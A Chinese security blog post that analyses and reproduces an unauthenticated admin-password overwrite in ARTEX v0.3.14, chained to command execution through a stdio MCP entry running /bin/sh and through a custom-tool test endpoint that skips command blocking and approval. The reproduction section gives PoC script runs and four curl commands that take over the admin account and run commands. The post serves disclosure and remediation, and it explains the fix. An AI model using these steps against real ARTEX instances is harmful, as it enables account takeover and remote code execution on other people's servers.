#  AI挖漏洞项目ARTEX，密码重置漏洞与命令执行漏洞分析复现  
原创 安全透视镜
                        安全透视镜  网络安全透视镜   2026-10-18 14:31  
  
VULN CASE FILE  
2026.10.18  
  
ARTEX 漏洞分析复现  
 ·   
密码重置 × 命令执行  
  
  
CASE 018  
  
打满连接池 → 覆盖管理员密码 → 签发 JWT → MCP stdio 拉起子进程  
  
严重 · CVSS 9.0  
影响 ≤ v0.3.14  
  
EDITOR'S NOTE  
  
先说结论  
  
如果你的 ARTEX 版本小于等于 v0.3.14，并且暴露过公网，请立刻去后台看一眼 MCP 列表和审计日志。这不是一次理论上的风险评估，而是一条已经被人在真实环境里走通过的路：从公网发起、不需要任何凭据，先把管理员密码改成自己的，再新建一个 stdio 类型的 MCP，服务器就把 /bin/sh 交到了对方手上。  
  
01  
  
PART  
  
一条四步到 RCE 的链路  
  
ATTACK CHAIN  
  
整条链路只有四步，起点是公开的、  
不需要任何凭据。第一步把数据库连接数打到上限，让程序读配置失败；第二步在失败窗口里调用「设置初始密码」接口，覆盖掉已有哈希并当场拿到 token；第三步用这个 token 新建一个 stdio 类型的 MCP；第四步，  
MCP 服务端把 command 直接当子进程拉起来。  
  
ATTACK PATH  
  
从无凭据到服务器命令执行  
打满连接池应用内部读失败判未初始化覆盖密码签发 JWTMCP 子进程命令执行  
前两步是认证缺陷，后两步是产品设计。前者是可以修的 bug，后者是 MCP 协议本身的行为——两者串起来才构成从公网直达命令执行的完整路径。  
  
值得注意的是  
MCP 这部分不是漏洞。MCP 协议本身就规定 stdio 传输方式下由客户端拉起服务端进程，界面上填 command 和 args、服务端照做，这是符合协议的实现。真正的问题是  
谁能配置 MCP——在正常情况下那应该只有已经登录的管理员。  
  
02  
  
PART  
  
根因：一个被丢掉的 error  
  
ROOT CAUSE  
  
ARTEX 只有一个固定管理员账号，密码以 bcrypt 哈希存在 PostgreSQL 的   
settings 表里，键名是   
auth.password_hash。「设置初始密码」这个接口本来该只在首次部署时可用，它在路由表里被显式豁免了鉴权，  
所以它是未认证可达的。  
  
问题出在 v0.3.14 的   
server/auth.go。守卫判断只有一行：  
  
.  
.  
.  
go  
  
existing, _, _ := pg.GetSetting(authPassKey)  
  
if existing != "" {  
  
　　writeErr(w, 403, "密码已设置")  
  
　　return  
  
}  
  
// ...  
  
if err := pg.SetSetting(authPassKey, string(hash)); err != nil {  
  
　　writeErr(w, 500, "保存失败: "+err.Error())  
  
　　return  
  
}  
  
tok, _ := signJWT(s.jwtKey)  
  
writeJSON(w, 200, map[string]any{"token": tok})  
  
第三个返回值就是 error，被  
下划线丢掉了。而   
GetSetting 在查询失败时返回的，恰好也是空字符串：  
  
.  
.  
.  
go  
  
func (d *DB) GetSetting(key string) (value string, ok bool, err error) {  
  
　err = d.QueryRow(`SELECT value FROM settings`, key).Scan(&value)  
  
　if err == sql.ErrNoRows {  
  
　　return "", false, nil　　// 键不存在  
  
　}  
  
　if err != nil {  
  
　　return "", false, err　　// 连接失败，value 同为 ""  
  
　}  
  
　return value, true, nil  
  
}  
  
// SetSetting 是 UPSERT —— 直接覆盖已有值  
  
**一句话概括根因**  
 代码没能区分「查不到」和「没有」这两种状态，于是数据库的一次瞬时故障被当成了「这个系统还没初始化过」。同一个文件里的登录和改密码接口都老老实实检查了 ok，只有这一个把 error 丢了。  
  
触发条件也是可以由攻击者主动制造的。v0.3.14 的   
db.Open 没有调用   
SetMaxOpenConns，所以大量并发的未认证请求能把应用侧连接数一路顶到 PostgreSQL 的   
max_connections。此后新的查询拿到的是   
sorry, too many clients already，读设置失败，守卫失效；而覆盖密码那一步发生在 bcrypt 计算的几十毫秒之后，那会儿连接池里往往又空出了一条。  
  
03  
  
PART  
  
它不是偶发，它被用过  
  
FORENSICS  
  
这一段是整件事里最值得学的部分。ARTEX 的认证行为  
零日志——登录、改密码、初始化密码，一条都不记。日志里干干净净，看不出任何异常。但密码那一行是真的被改过，而且改了很多次。  
  
破局点在 PostgreSQL 自己身上。  
UPDATE 会留下死元组，旧版本的数据不会立刻消失，还躺在堆里。于是有人直接把 settings 表里管理员密码那一行的历史版本挖了出来，一共恢复出 38 个。  
  
CASE#### 38 个密码版本  
  
  
ARTEX / 自建 Docker 部署 / 单人使用  
  
从死元组里恢复出的时间线里，10 月 10 日 17:09 有一次单独的密码写入；10 月 11 日 11:48:45 到 11:48:47 这不到两秒的窗口内，出现了 36 次密码写入。  
  
**平均 48 毫秒一次，而本机跑一次 bcrypt 大约要 130 毫秒。串行绝对做不到，只可能是并发打进来的。**  
  
这条时间线和后文的利用链完全对得上：一个正常的用户初始化密码一次，剩下  
36 次在两秒内并发涌入的覆盖，正是攻击者一边压连接池、一路打   
/api/auth/init 的典型特征。  
  
还有一个容易被忽略的细节：到了 10 月 15 日，管理员登录突然进不去了。当时以为是密码记错，就走了重置。  
其实那时候密码早就已经不是自己的了——锁死真实管理员、逼着走重置流程，本身就是接管的一部分。  
  
04  
  
PART  
  
拿到密码之后，只剩两步  
  
MCP STDO RCE  
  
MCP 列表里莫名多出来一条记录，创建时间是 10 月 10 日 16:19:42：  
  
.  
.  
.  
yaml  
  
name: h1probe  
  
transport: stdio  
  
command: /bin/sh  
  
args: ["-c", "id; hostname; echo H1_STDIO_RCE_OK"]  
  
enabled: true  
  
同一个时间点，日志里留了一条报错：  
  
.  
.  
.  
log  
  
[mcp] h1probe添加后工具发现失败: mcp: connection closed  
  
这条报错  
恰恰是执行成功的证据。  
/bin/sh 打印完内容就退出了，它并不会说 MCP 协议，所以连接断开，ARTEX 如实记录了「工具发现失败」。  
  
换成正常运维会怎么排查？多半会把这个当作一次无害的「配置写错了」直接删掉。  
凡是提示「发现失败」的 MCP 配置，都应该当成入侵线索来看，而不是当成用户手误。  
  
05  
  
PART  
  
复现：竞态靠运气，根因靠确定性  
  
REPRODUCTION  
  
复现这条链路有两条路。公开的 PoC 走  
远程竞态：高并发反复请求状态接口打满连接池，同时不停打初始化接口，直到某次返回 200。它自己也声明「对时序、客户端硬件、目标性能高度敏感，不保证成功」。  
  
组件  
  
本次实测环境  
  
系统  
  
Ubuntu 24.04 x86_64  
  
Go 工具链  
  
go1.27.2 linux/amd64  
  
PostgreSQL  
  
16.14，max_connections = 100  
  
ARTEX  
  
v0.3.14 与 v0.3.15 各编一份  
  
方式 A · 远程竞态（贴近真实攻击）  
  
两个版本分别起一个实例，端口错开，避免互相干扰：  
  
.  
.  
.  
bash  
  
ARTEX_PG_DSN="postgres://artex@127.0.0.1:55432/artex14?sslmode=disable" ./artex14-bin -addr 127.0.0.1:18787 -data /tmp/run14/data -proxy ""  
  
ARTEX_PG_DSN="postgres://artex@127.0.0.1:55432/artex15?sslmode=disable" ./artex15-bin -addr 127.0.0.1:18788 -data /tmp/run15/data -proxy ""  
  
然后打竞态：  
  
.  
.  
.  
bash  
  
python3 poc/poc_race.py -t http://TARGET:8787 -p 'Artxploit@2026' --requests 10000 --concurrency 3000  
  
本地实测这条路  
两轮都没命中，4000 次和 10000 次全是 403。原因可以量化：压测期间数据库里该库的后端连接峰值只有 7，连接池压根没被打空。  
远程利用依赖竞态，根因却是确定性的——这两件事必须分开看。  
  
要证明根因，不需要运气。在应用和数据库之间插一个可控代理，用「断开 35 毫秒」精确制造读失败，再在 bcrypt 计算窗口内恢复连接，就模拟出了「读的时候失败、写的时候刚好有空闲连接」这个窗口。三步走：  
  
 第一步：启动可控代理   
  
应用连 55433，代理转发到真实的 55432：  
  
.  
.  
.  
bash  
  
python3 poc/pg_outage_proxy.py --listen 55433 --control 55434 --upstream 127.0.0.1:55432  
  
 第二步：让实例改走代理连库   
  
唯一的区别就是 DSN 指向代理端口：  
  
.  
.  
.  
bash  
  
ARTEX_PG_DSN="postgres://artex@127.0.0.1:55433/artex14?sslmode=disable" ./artex14-bin -addr 127.0.0.1:18787 -data /tmp/run14/data -proxy ""  
  
 第三步：执行利用   
  
脚本会自动完成「断开 → 未认证请求 → 恢复 → 登录 → 执行命令」全流程：  
  
.  
.  
.  
bash  
  
python3 poc/poc_failopen_deterministic.py -t http://127.0.0.1:18787 --outage-ms 35  
  
这一路在 v0.3.14 上  
百分之百命中。完整输出如下，每一步对应什么值得看清楚：  
  
.  
.  
.  
output  
  
[*] 2) 受害者设置管理员密码（模拟已存在的正常实例）  
  
　　403 {"error":"密码已设置"}  
  
　　auth/status: {"initialized":true}  
  
[*] 3) 断开数据库连接（模拟 max_connections 耗尽）35ms  
  
　　proxy: down  
  
[*] 4) 发起未认证的 POST /api/auth/init，并在 bcrypt 窗口内恢复数据库  
  
　　proxy: up  
  
　　-> HTTP 200 {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}  
  
[*] 6) POST /api/auth/login （攻击者密码）  
  
　　200 {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}  
  
[*] 7) POST /api/tools/custom/test （执行命令）  
  
　　HTTP 200 {"is_error":false,"output":"uid=1000(iot) gid=1000(iot) ...\nresearch\nLinux 6.8.0-100-generic\n"}  
  
[+] 未授权 → 管理员密码覆盖 → 命令执行  
  
关键就在第 4 步：  
POST /api/auth/init 是一个  
完全不带凭据的请求，却返回了 200 和一枚 JWT。第 7 步执行   
id; hostname; uname -sr 成功回显，  
从公网到 RCE 的全链就此打通。  
  
手工复现 · 四条 curl 走完全程  
  
不想跑脚本的话，四条命令就够了。整个过程  
自始至终没有出现过任何凭据——这正是它危险的地方。  
  
 第 1 步：确认目标已经初始化   
  
bash  
  
curl -s http://TARGET:8787/api/auth/status  
  
# {"initialized":true}  
  
 第 2 步：在数据库不可用窗口内发起初始化   
  
不需要任何 header，不需要 Cookie，只有请求体里那个要覆盖的密码：  
  
bash  
  
curl -s -X POST http://TARGET:8787/api/auth/init -H 'Content-Type: application/json' -d '{"password":"Artxploit@2026"}'  
  
# 命中：200 {"token":"eyJ..."}  
  
# 未命中：403 {"error":"密码已设置"}  
  
 第 3 步：用刚设的密码正常登录   
  
bash  
  
curl -s -X POST http://TARGET:8787/api/auth/login -H 'Content-Type: application/json' -d '{"username":"ARTEX","password":"Artxploit@2026"}'  
  
# 200 {"token":"eyJ..."}  
  
 第 4 步：拿 JWT 执行命令   
  
管理员能执行的，这里就能执行。把上一步拿到的 token 填进 Authorization 头：  
  
bash  
  
curl -s -X POST http://TARGET:8787/api/tools/custom/test -H 'Content-Type: application/json' -H "Authorization: Bearer $TOKEN" -d '{"kind":"command","exec":{"command":"id","timeout_ms":10000},"params":{}}'  
  
# 200 {"is_error":false,"output":"uid=...\n"}  
  
**留个心眼**  
 第 4 步那个自定义工具测试接口，  
并没有走命令拦截和审批。管理员在后台配的「破坏性命令禁止」「转人工审批」对它统统不生效，这条路径下执行命令是没有审计记录的。这本身是另一条独立问题，但在本链里它是 RCE 放大器。  
  
验证项  
  
v0.3.14  
  
v0.3.15  
  
未认证调 init  
  
200 + JWT  
  
503 暂不可用  
  
攻击者密码登录  
  
200 登录成功  
  
401 用户名或密码错  
  
命令执行回显  
  
uid= 回显成功  
  
未进入该分支  
  
1500 并发压测  
  
连接无上限  
  
峰值 8 · 服务正常  
  
同一套 PoC 打在修复版上，未认证请求拿到的是   
503 数据源暂时不可用，攻击者密码登录 401。  
同一个动作，从「拿到管理员身份」变成了「明确拒绝」，这就是修复与否的分界线。  
  
v0.3.15 上的实际输出，同样四步：  
  
.  
.  
.  
output · v0.3.15  
  
[*] 4) 发起未认证的 POST /api/auth/init，并在 bcrypt 窗口内恢复数据库  
  
　　-> HTTP 503 {"error":"数据源暂时不可用，请稍后重试"}  
  
[*] 6) POST /api/auth/login （攻击者密码）  
  
　　401 {"error":"用户名或密码错误"}  
  
[-] 攻击者密码未生效（fail-closed），漏洞不可利用  
  
顺便说一句：v0.3.15 上跑 1500 并发的未认证状态查询，数据库连接峰值只有 8，服务完全正常。连接池封顶这一层的效果是可量化的。  
  
复现这套东西一共三个脚本，按用途分：  
  
脚本  
  
用途  
  
poc_race.py  
  
远程竞态，对真实目标  
  
poc_failopen_deterministic.py  
  
确定性复现，实验室 100% 命中  
  
pg_outage_proxy.py  
  
配套可控 TCP 代理  
  
06  
  
PART  
  
修复做了三层，缺一层都不够  
  
THE FIX  
  
 读失败改成 fail-closed   
  
状态查询、初始化、改密码、登录四个 handler 全部改为检查 error，读失败一律返回 503，绝不再把故障当成「未初始化」。这是治本的一层。  
  
 「仅首次可设」下沉到数据库   
  
写入从 UPSERT 改成   
INSERT ... ON CONFLICT DO NOTHING。就算上面的检查因为任何原因失效，数据库层面也不会覆盖已有哈希——这一层是防并发的兜底。  
  
 连接池封顶   
  
设置最大连接数为 32，超额请求排队等待，而不是把数据库顶到上限，同时让「连接耗尽」表现为变慢而不是报错，从源头削弱了触发条件。  
  
**这三层缺一层都不够**  
 只加连接池上限，是把竞态窗口收窄了，根因还在；只改 fail-closed，并发写仍然可能覆盖。只做其中一层，下一个版本的一次重构就可能把它带回来。  
  
07  
  
PART  
  
如果你正在用 ARTEX  
  
WHAT TO DO NOW  
  
 第一步：先查，再撤   
  
逐条看 MCP 列表，凡是名字看不懂、创建时间对不上、或者状态是「工具发现失败」的，全部当成入侵线索保留现场再删。顺手确认管理员密码是不是自己最后一次设的那个。  
  
 第二步：撤出公网   
  
在补丁到位之前，先把端口映射收回本机回环，只走 SSH 隧道或内网访问：  
  
yaml  
  
ports:  
  
　- "127.0.0.1:8787:8787"  
  
　- "127.0.0.1:8788:8788"  
  
 第三步：升级到 v0.3.15 及以后   
  
升级后建议顺手做两件事：轮换一次 JWT 签名密钥，把可能还在流通的旧 token 一次性作废；给   
/api/auth/* 补上认证行为的审计日志。ARTEX 的 token 里只有主体、签发时间和过期时间，没有会话编号，也没有密码版本号——  
改密码不会让旧 token 失效，这一条到现在仍然成立。  
  
 第四步：审计还在跑的那些 MCP   
  
任何指向内网、或者指向你自己控制的服务端的 MCP 配置都要重新评估。另外顺带提一句：调试用的自定义工具测试接口是直接调 Bash 的，  
没有挂命令拦截和审批，管理员配的「破坏性命令禁止」对它不生效。  
  
///  
  
END  
  
比这个洞更值得记住的  
  
TAKEAWAY  
  
这次暴露出来的是一个编程习惯问题，不是一个人的疏忽。  
数据库操作失败时，代码必须能区分「没有」和「查不到」。凡是读取配置、读取状态的鉴权路径，都应该让 err 一票否决，而不是顺手用下划线丢掉。这条经验不止适用于 ARTEX——把它推广到自己所有的代码库去审一遍，成本远低于出事之后。  
  
还有一点：  
认证行为零日志是个被低估的问题。日志干净不代表没出事。这次是靠翻数据库死元组才把攻击痕迹捞出来的，下一个连 PostgreSQL 都不用的系统，可能连这条线索都没有。  
  
**永远不要把自己没审计过的系统，直接开到公网上。**  
  
我是 网络安全透视镜，网络与信息安全领域从业者  
  
如果你觉得今天这篇有收获，欢迎点赞、在看、转发三连，我们下篇见  
  
赞  
  
  
在看  
  
  
收藏  
  
THANKS FOR READING  
  
  
